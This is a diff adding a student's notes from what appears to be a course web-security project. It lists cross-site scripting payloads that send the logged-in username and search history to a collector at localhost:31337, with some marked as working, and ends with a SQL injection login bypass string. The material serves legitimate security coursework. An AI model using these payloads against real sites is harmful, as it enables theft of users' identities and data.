@@ -1,0 +1,33 @@
+Alert tests: 
+<script>alert($(window).load(function(){$("#history-list").children()[1].text}))</script>
+
+<script>alert($("#history-list").children()[0].text)</script>
+
+<script>alert($("#logged-in-user").text())</script>
+
+
+malicious URL just stolen user (does not work):
+https://project2.ecen4133.org/search?xssdefense=0&q=<script>window.location='http://localhost:31337/?stolen_user='+$('#logged-in-user').text()</script>
+
+
+malicious URL combo tries (none work):
+https://project2.ecen4133.org/search?xssdefense=0&q=<script>window.location='http://localhost:31337/?stolen_user='+$("#logged-in-user").text()+ '&last_search='+$("#history-list").children()[0].text</script>
+
+https://project2.ecen4133.org/search?xssdefense=0&q=<script>window.location='http://localhost:31337/?stolen_user='+$("#logged-in-user").text()+ '&last_search='+$(window).load(function(){$("#history-list").children()[1].innerHTML})</script>
+
+
+THIS WORKS (manual input into search bar):
+
+Just stolen user:
+<script>window.location='http://localhost:31337/?stolen_user='+$("#logged-in-user").text()</script>
+
+Just last search:
+<script>$(window).load(function(){window.location='http://localhost:31337/?last_search='+$("#history-list").children()[1].innerHTML})</script>
+
+Use Get Request???
+
+https://project2.ecen4133.org/search?xssdefense=0&q=<script>$.get('http://localhost:31337/?stolen_user='hello')</script>
+
+
+FOR SQL 1.3:
+password='abc'='fgt'
